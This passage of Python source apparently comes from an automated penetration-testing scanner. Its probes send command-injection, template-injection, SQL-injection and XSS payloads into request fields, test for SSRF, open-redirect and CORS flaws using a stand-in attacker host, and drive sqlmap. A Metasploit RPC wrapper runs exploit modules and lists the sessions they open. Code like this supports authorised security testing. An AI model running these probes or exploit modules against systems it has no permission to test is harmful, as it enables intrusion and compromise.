            hit = False

            # cmdi (arithmetic, reflection-proof)
            for inj in (f";echo $(({a}*{b}))", f"|echo $(({a}*{b}))",
                        f"$(({a}*{b}))", f"`expr {a} \\* {b}`"):
                try:
                    r = await send(_set(body, path, sorig + inj))
                    if product in r.text and product not in baseline:
                        findings.append({"field": label, "class": "cmdi", "payload": inj,
                                         "proof": f"shell evaluated {a}*{b}={product} server-side"})
                        hit = True
                        break
                except Exception:
                    pass
            if hit:
                continue

            # ssti (arithmetic across template syntaxes)
            for pl in (f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}", f"#{{{a}*{b}}}", f"<%= {a}*{b} %>"):
                try:
                    r = await send(_set(body, path, pl))
                    if product in r.text and product not in baseline:
                        findings.append({"field": label, "class": "ssti", "payload": pl,
                                         "proof": f"template engine evaluated {a}*{b}={product}"})
                        hit = True
                        break
                except Exception:
                    pass
            if hit:
                continue

            # error-based SQLi (single quote provokes a DB error)
            try:
                r = await send(_set(body, path, sorig + "'"))
                low = r.text.lower()
                if any(s in low for s in SQL_ERRS) and not any(s in base_low for s in SQL_ERRS):
                    findings.append({"field": label, "class": "sqli", "payload": "' (single quote)",
                                     "proof": "single quote provoked a SQL error in the response"})
                    hit = True
            except Exception:
                pass
            if hit:
                continue

            # reflected XSS — only real if the body is rendered as HTML
            m = "kx" + secrets.token_hex(3)
            tail = "<svg/onload=alert(1)>"
            try:
                r = await send(_set(body, path, m + tail))
                if m + tail in r.text and _is_html(r):
                    findings.append({"field": label, "class": "xss", "payload": tail,
                                     "proof": "marker reflected unescaped in an HTML response"})
            except Exception:
                pass

    return {"url": url, "method": method, "vulnerable": len(findings) > 0,
            "findings": findings,
            "tested_fields": [".".join(str(p) for p in pp) for pp in paths],
            "note": "JSON-body injection (cmdi/ssti/sqli/xss) — proof by execution/signature."}


async def _ssrf_probe(url: str) -> dict:
    """Test SSRF out-of-band: start a local listener, pass its unique URL as
    each candidate parameter, and if the TARGET server connects back to our
    listener it fetched an attacker-controlled URL => SSRF confirmed. Catches
    blind SSRF (no response body needed). Real external targets need a public
    collaborator host; for localhost/internal targets this listener works."""
    import httpx
    import secrets
    import asyncio
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    if not url.startswith("http"):
        url = f"http://{url}"
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        return {"url": url, "vulnerable": False,
                "note": "No query parameters to test for SSRF."}

    tokens, hits = set(), set()

    async def handle(reader, writer):
        try:
            data = await asyncio.wait_for(reader.read(2048), timeout=2)
            text = data.decode("latin1", "replace")
            for tok in tokens:
                if tok in text:
                    hits.add(tok)
        except Exception:
            pass
        finally:
            try:
                writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")
                await writer.drain()
            except Exception:
                pass
            try:
                writer.close()
            except Exception:
                pass

    server = await asyncio.start_server(handle, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]

    # Test URL-looking params first.
    url_kw = ("url", "uri", "link", "fetch", "dest", "redirect", "next", "callback",
              "target", "feed", "img", "image", "load", "file", "proxy", "site", "host", "domain")
    params = sorted(qs, key=lambda k: 0 if any(w in k.lower() for w in url_kw) else 1)

    findings = []
    async with server:
        async with auth_client(timeout=8, follow_redirects=True, verify=False) as client:
            for pname in params:
                token = "kx" + secrets.token_hex(4)
                tokens.add(token)
                payload = f"http://127.0.0.1:{port}/{token}"
                tp = {k: v[0] for k, v in qs.items()}
                tp[pname] = payload
                turl = urlunparse(parsed._replace(query=urlencode(tp)))
                try:
                    await client.get(turl)
                except Exception:
                    pass
                await asyncio.sleep(0.6)  # let the target call back
                if token in hits:
                    findings.append({"param": pname, "payload": payload,
                                     "proof": "target server connected to our listener (fetched our URL)"})

    return {
        "url": url,
        "vulnerable": len(findings) > 0,
        "findings": findings,
        "tested_params": list(qs.keys()),
        "note": "OOB SSRF: target fetched an attacker-controlled URL. Real external targets need a public collaborator.",
    }


_REDIRECT_KW = ("url", "next", "return", "returnurl", "return_url", "redirect",
                "redir", "dest", "destination", "continue", "goto", "to", "target", "rurl", "u")
_OOB_DOMAIN = "kryx-oob.example"


async def _open_redirect_probe(url: str) -> dict:
    """Open redirect: inject an external destination into redirect-ish params and
    confirm the server issues a 3xx Location to our off-site domain."""
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    if not url.startswith("http"):
        url = f"http://{url}"
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        return {"url": url, "vulnerable": False, "note": "No query parameters to test."}

    findings = []
    async with auth_client(timeout=8, follow_redirects=False, verify=False) as client:
        for pname in qs:
            if not any(k == pname.lower() or k in pname.lower() for k in _REDIRECT_KW):
                continue
            for payload in (f"https://{_OOB_DOMAIN}/", f"//{_OOB_DOMAIN}/"):
                tp = {k: v[0] for k, v in qs.items()}
                tp[pname] = payload
                turl = urlunparse(parsed._replace(query=urlencode(tp)))
                try:
                    r = await client.get(turl)
                except Exception:
                    continue
                loc = r.headers.get("location", "")
                if r.status_code in (301, 302, 303, 307, 308) and \
                        loc.lstrip().startswith(("http://" + _OOB_DOMAIN, "https://" + _OOB_DOMAIN, "//" + _OOB_DOMAIN)):
                    findings.append({"param": pname, "payload": payload,
                                     "proof": f"302 -> Location: {loc} (off-site)"})
                    break
    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
            "note": "Open redirect: server redirects to an attacker-controlled external URL."}


async def _cors_probe(url: str) -> dict:
    """CORS misconfig: send an arbitrary Origin; flag if it's reflected in
    Access-Control-Allow-Origin (worse with Allow-Credentials: true)."""
    if not url.startswith("http"):
        url = f"http://{url}"
    evil = f"https://evil.{_OOB_DOMAIN}"
    async with auth_client(timeout=8, follow_redirects=True, verify=False) as client:
        try:
            r = await client.get(url, headers={"Origin": evil})
        except Exception as e:
            return {"url": url, "vulnerable": False, "error": str(e)}

    acao = r.headers.get("access-control-allow-origin", "")
    acac = r.headers.get("access-control-allow-credentials", "").lower()
    vulnerable, severity, detail = False, "medium", ""
    if acao == evil:
        vulnerable, detail = True, f"reflects arbitrary Origin ({acao})"
        if acac == "true":
            severity, detail = "high", detail + " WITH credentials (session-theft grade)"
    elif acao == "*" and acac == "true":
        vulnerable, severity, detail = True, "high", "Allow-Origin '*' together with credentials"

    return {"url": url, "vulnerable": vulnerable, "severity": severity, "evidence": detail,
            "remediation": "Allowlist specific trusted origins; never reflect arbitrary Origin, and never combine a wildcard/reflected origin with Allow-Credentials."}


async def _ssl_audit(host: str) -> dict:
    if _available("testssl.sh"):
        result = await _run(["testssl.sh", "--quiet", host], timeout=60)
        return {"host": host, "raw": result["stdout"][:4000], "tool": "testssl.sh"}

    # Fallback: basic SSL via Python
    import ssl as _ssl
    import socket as _socket
    from datetime import datetime

    ctx = _ssl.create_default_context()
    try:
        with ctx.wrap_socket(_socket.socket(), server_hostname=host) as s:
            s.settimeout(5)
            s.connect((host, 443))
            cert = s.getpeercert()
            cipher = s.cipher()
            expiry = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
            days_left = (expiry - datetime.utcnow()).days

            return {
                "host": host,
                "subject": dict(x[0] for x in cert["subject"]),
                "issuer": dict(x[0] for x in cert["issuer"]),
                "expires": str(expiry),
                "days_left": days_left,
                "expired": days_left < 0,
                "expiring_soon": 0 <= days_left <= 30,
                "cipher": cipher[0] if cipher else None,
                "san": [v for _, v in cert.get("subjectAltName", [])],
            }
    except Exception as e:
        return {"error": str(e), "host": host}


async def _sqlmap_check(url: str) -> dict:
    if not _available("sqlmap"):
        return {"error": "sqlmap not installed. Run: sudo apt install sqlmap"}

    # --flush-session: never trust a cached verdict from a prior (possibly
    # interrupted) run. Level 3 catches boolean payloads that level 2 misses on
    # real targets (e.g. ginandjuice's category SQLi); BEU keeps the fast,
    # high-signal techniques (drop slow time-based/stacked). Env-tunable.
    level = os.getenv("KRYX_SQLMAP_LEVEL", "3")
    risk = os.getenv("KRYX_SQLMAP_RISK", "2")
    result = await _run([
        "sqlmap", "-u", url,
        "--batch", "--random-agent", "--flush-session",
        "--level", level, "--risk", risk,
        "--technique", "BEU",
        *_sqlmap_auth_args(),  # --cookie / --header for authenticated scans
    ], timeout=200)

    out = result.get("stdout", "")
    low = out.lower()
    # Match the VERDICT only — not the per-test "testing '... injectable'" lines
    # (which appear even when nothing is vulnerable). sqlmap prints the
    # "Parameter:/Type:/Payload:" block and "is vulnerable" only on a real hit.
    vulnerable = (
        "the following injection point" in low
        or "is vulnerable" in low
        or ("Parameter:" in out and "Type:" in out and "Payload:" in out)
    ) and "do not appear to be injectable" not in low

    # Pull the injection summary block as evidence.
    evidence = ""
    if "Parameter:" in out:
        evidence = out[out.index("Parameter:"):][:1200]

    return {
        "url": url,
        "vulnerable": vulnerable,
        "evidence": evidence,
        "error": result.get("error"),
        "raw": out[:3000],
    }


async def _whatweb(url: str) -> dict:
    if not _available("whatweb"):
        return {"error": "whatweb not installed. Run: sudo apt install whatweb"}

    if not url.startswith("http"):
        url = f"https://{url}"

    result = await _run(["whatweb", "--no-errors", url], timeout=30)
    return {"url": url, "technologies": result["stdout"].strip()}


async def _cve_lookup(keyword: str) -> dict:
    import httpx

    async with httpx.AsyncClient(timeout=15) as client:
        r = await client.get(
            "https://services.nvd.nist.gov/rest/json/cves/2.0",
            params={"keywordSearch": keyword, "resultsPerPage": 5},
        )
        data = r.json()
        cves = []
        for item in data.get("vulnerabilities", []):
            cve = item["cve"]
            metrics = cve.get("metrics", {})
            cvss = (
                metrics.get("cvssMetricV31", [{}])[0].get("cvssData", {}).get("baseScore")
                or metrics.get("cvssMetricV2", [{}])[0].get("cvssData", {}).get("baseScore")
            )
            cves.append({
                "id": cve["id"],
                "description": cve["descriptions"][0]["value"][:300],
                "cvss": cvss,
                "published": cve["published"][:10],
            })
        return {"cves": cves, "total": data.get("totalResults", 0)}


async def _dns_lookup(domain: str) -> dict:
    import dns.resolver

    def resolve():
        out = {}
        for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]:
            try:
                out[rtype] = [r.to_text() for r in dns.resolver.resolve(domain, rtype)]
            except Exception:
                out[rtype] = []
        return out

    return await asyncio.to_thread(resolve)


async def _whois_lookup(domain: str) -> dict:
    import whois

    def fetch():
        w = whois.whois(domain)
        return {
            "registrar": str(w.registrar),
            "creation_date": str(w.creation_date),
            "expiration_date": str(w.expiration_date),
            "name_servers": [str(n) for n in (w.name_servers or [])],
            "country": str(w.country),
        }

    return await asyncio.to_thread(fetch)


# ── Shodan ─────────────────────────────────────────────────

async def _shodan_lookup(target: str) -> dict:
    if not SHODAN_API_KEY:
        return {"error": "SHODAN_API_KEY not set in .env"}

    import httpx
    import socket

    # Resolve hostname to IP if needed
    ip = target
    try:
        if not target.replace(".", "").isdigit():
            ip = socket.gethostbyname(target)
    except Exception:
        pass

    async with httpx.AsyncClient(timeout=15) as client:
        r = await client.get(
            f"https://api.shodan.io/shodan/host/{ip}",
            params={"key": SHODAN_API_KEY},
        )
        if r.status_code == 404:
            return {"target": target, "ip": ip, "message": "No Shodan data for this host"}
        if r.status_code != 200:
            return {"error": f"Shodan API error: {r.status_code}"}

        data = r.json()

        ports = data.get("ports", [])
        vulns = list(data.get("vulns", {}).keys())  # CVE IDs

        services = []
        for item in data.get("data", [])[:20]:
            services.append({
                "port": item.get("port"),
                "transport": item.get("transport", "tcp"),
                "product": item.get("product", ""),
                "version": item.get("version", ""),
                "banner": (item.get("data") or "")[:200],
            })

        return {
            "target": target,
            "ip": ip,
            "org": data.get("org", ""),
            "country": data.get("country_name", ""),
            "os": data.get("os"),
            "open_ports": ports,
            "services": services,
            "cves": vulns,  # CVEs Shodan detected
            "hostnames": data.get("hostnames", []),
            "tags": data.get("tags", []),
            "last_update": data.get("last_update", ""),
        }


# ── Censys ─────────────────────────────────────────────────

async def _censys_lookup(target: str) -> dict:
    if not CENSYS_API_ID or not CENSYS_API_SECRET:
        return {"error": "CENSYS_API_ID / CENSYS_API_SECRET not set in .env"}

    import httpx
    import socket

    ip = target
    try:
        if not target.replace(".", "").isdigit():
            ip = socket.gethostbyname(target)
    except Exception:
        pass

    async with httpx.AsyncClient(timeout=15, auth=(CENSYS_API_ID, CENSYS_API_SECRET)) as client:
        # Hosts API v2
        r = await client.get(f"https://search.censys.io/api/v2/hosts/{ip}")
        if r.status_code == 404:
            return {"target": target, "ip": ip, "message": "No Censys data for this host"}
        if r.status_code != 200:
            return {"error": f"Censys API error: {r.status_code}"}

        data = r.json().get("result", {})

        services = []
        for svc in data.get("services", [])[:20]:
            services.append({
                "port": svc.get("port"),
                "transport": svc.get("transport_protocol", "TCP"),
                "service_name": svc.get("service_name", ""),
                "product": svc.get("software", [{}])[0].get("product", "") if svc.get("software") else "",
                "tls": svc.get("tls", {}).get("certificates", {}).get("leaf_data", {}).get("subject_dn", ""),
            })

        return {
            "target": target,
            "ip": ip,
            "autonomous_system": data.get("autonomous_system", {}).get("name", ""),
            "country": data.get("location", {}).get("country", ""),
            "services": services,
            "open_ports": [s["port"] for s in services],
            "last_updated": data.get("last_updated_at", ""),
        }


# ── Metasploit RPC ─────────────────────────────────────────

async def _msf_rpc_call(method: str, *args) -> dict:
    """Low-level Metasploit RPC call via msgpack over HTTP."""
    try:
        import httpx
        import msgpack
    except ImportError:
        return {"error": "msgpack not installed. Run: pip install msgpack"}

    url = f"http://{MSFRPC_HOST}:{MSFRPC_PORT}/api/1.0"

    # Authenticate first to get token
    async with httpx.AsyncClient(timeout=15) as client:
        auth_payload = msgpack.packb(["auth.login", "msf", MSFRPC_PASS], use_bin_type=True)
        r = await client.post(url, content=auth_payload, headers={"Content-Type": "binary/message-pack"})
        auth_data = msgpack.unpackb(r.content, raw=False)
        token = auth_data.get("token")
        if not token:
            return {"error": "Metasploit RPC auth failed. Is msfrpcd running?"}

        # Make actual call
        payload = msgpack.packb([method, token, *args], use_bin_type=True)
        r = await client.post(url, content=payload, headers={"Content-Type": "binary/message-pack"})
        return msgpack.unpackb(r.content, raw=False)


async def _msf_search(query: str) -> dict:
    result = await _msf_rpc_call("module.search", query)
    if "error" in result:
        return result

    modules = []
    for m in (result.get("modules") or [])[:15]:
        modules.append({
            "fullname": m.get("fullname", ""),
            "name": m.get("name", ""),
            "type": m.get("type", ""),
            "rank": m.get("rank", ""),
            "description": m.get("description", "")[:150],
            "cve": [r for r in m.get("references", []) if "CVE" in str(r)],
        })

    return {"query": query, "modules": modules, "count": len(modules)}


async def _msf_run(module: str, options: dict) -> dict:
    """Run a Metasploit module. Creates a console session and executes."""
    # Create console
    console_result = await _msf_rpc_call("console.create")
    if "error" in console_result:
        return console_result

    console_id = str(console_result.get("id", "0"))

    # Build commands
    cmds = [f"use {module}"]
    for k, v in options.items():
        cmds.append(f"set {k} {v}")
    cmds.append("run -j")  # run as job (non-blocking)

    commands = "\n".join(cmds) + "\n"

    # Write commands to console
    await _msf_rpc_call("console.write", console_id, commands)
    await asyncio.sleep(3)  # wait for execution

    # Read output
    output_result = await _msf_rpc_call("console.read", console_id)
    output = output_result.get("data", "") if isinstance(output_result, dict) else ""

    # Destroy console
    await _msf_rpc_call("console.destroy", console_id)

    # Check for sessions
    sessions_result = await _msf_rpc_call("session.list")
    sessions = []
    if isinstance(sessions_result, dict):
        for sid, sdata in sessions_result.items():
            if sid not in ("result",):
                sessions.append({
                    "id": sid,
                    "type": sdata.get("type", ""),
                    "target": sdata.get("target_host", ""),
                    "info": sdata.get("info", ""),
                })

    return {
        "module": module,
        "options": options,
        "output": output[:3000],
        "sessions_opened": sessions,
    }


# ── Playwright browser automation ──────────────────────────

async def _browser_probe(url: str, actions: list | None = None) -> dict:
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return {"error": "playwright not installed. Run: pip install playwright && playwright install chromium"}

    results = {
        "url": url,
        "dom_snapshot": "",
        "console_errors": [],
        "network_requests": [],
        "forms": [],
        "links": [],
        "js_globals": [],
        "security_issues": [],
    }

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True, args=["--no-sandbox"])
        context = await browser.new_context(
            ignore_https_errors=True,
            user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        )
        page = await context.new_page()

        # Capture console errors
        page.on("console", lambda msg: results["console_errors"].append(
            {"type": msg.type, "text": msg.text}
        ) if msg.type == "error" else None)

        # Capture network requests (look for interesting endpoints)
        def on_request(req):
            if any(kw in req.url for kw in ("api", "graphql", "admin", "token", "auth")):
                results["network_requests"].append({
                    "url": req.url,
                    "method": req.method,
                    "headers": dict(list(req.headers.items())[:5]),
                })
        page.on("request", on_request)

        try:
            await page.goto(url, wait_until="networkidle", timeout=20000)
        except Exception as e:
            await browser.close()
            return {"error": f"Navigation failed: {e}", "url": url}

        # Execute optional actions (click, fill, navigate)
        if actions:
            for action in actions:
                try:
                    atype = action.get("type")
                    selector = action.get("selector", "")
                    value = action.get("value", "")
                    if atype == "click" and selector:
                        await page.click(selector, timeout=5000)
                    elif atype == "fill" and selector:
                        await page.fill(selector, value, timeout=5000)
                    elif atype == "navigate":
                        await page.goto(value, wait_until="networkidle", timeout=15000)
                    await asyncio.sleep(0.5)
                except Exception:
                    pass

        # Extract DOM info
        results["dom_snapshot"] = (await page.content())[:5000]

        # Extract forms (potential injection points)
        forms = await page.evaluate("""() => {
            return Array.from(document.forms).map(f => ({
                action: f.action,
                method: f.method,
                inputs: Array.from(f.elements).map(e => ({
                    name: e.name, type: e.type, id: e.id
                }))
            }));
        }""")
        results["forms"] = forms[:10]

        # Extract all links
        links = await page.evaluate("""() =>
            Array.from(document.querySelectorAll('a[href]'))
                .map(a => a.href)
                .filter(h => h.startsWith('http'))
                .slice(0, 30)
        """)
        results["links"] = links

        # Check for exposed JS globals (API keys, tokens)
        js_globals = await page.evaluate("""() => {
            const interesting = [];
            for (const key of Object.keys(window)) {
                if (/api|token|key|secret|config|auth/i.test(key)) {
                    try {
                        const val = JSON.stringify(window[key]);
                        if (val && val.length < 500) interesting.push({key, val});
                    } catch {}
                }
            }
            return interesting.slice(0, 20);
        }""")
        results["js_globals"] = js_globals

        # Detect security issues
        issues = []
        if any(e["text"] for e in results["console_errors"]):
            issues.append("JavaScript errors detected — may indicate unstable code paths")
        if js_globals:
            issues.append(f"Exposed JS globals with sensitive names: {[g['key'] for g in js_globals]}")
        if any("password" in str(f).lower() for f in forms):
            issues.append("Login form detected — test for auth bypass, brute force")
        if results["network_requests"]:
            issues.append(f"Interesting API endpoints: {[r['url'] for r in results['network_requests'][:3]]}")

        results["security_issues"] = issues

        await browser.close()

    return results